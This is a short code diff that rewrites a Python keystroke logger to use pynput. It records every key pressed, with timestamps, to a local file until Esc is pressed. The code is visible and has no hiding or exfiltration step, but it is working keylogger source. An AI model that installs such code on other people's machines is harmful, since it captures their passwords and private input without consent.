@@ -1,17 +1,20 @@
-import keyboard
+from pynput import keyboard
 import logging
 
 # Set up logging to file
 logging.basicConfig(filename="keystrokes.txt", level=logging.INFO, format='%(asctime)s - %(message)s')
 
-def on_key_event(event):
-    # Log each keystroke
-    logging.info('Key {} pressed'.format(event.name))
+def on_press(key):
+    try:
+        logging.info('Key pressed: {0}'.format(key.char))
+    except AttributeError:
+        logging.info('Special key pressed: {0}'.format(key))
 
-# Set up a listener for all keyboard events
-keyboard.on_press(on_key_event)
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
 
-print("Keystroke logger is running. Press 'Esc' to stop.")
-
-# Block the script and keep it running
-keyboard.wait('esc')
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
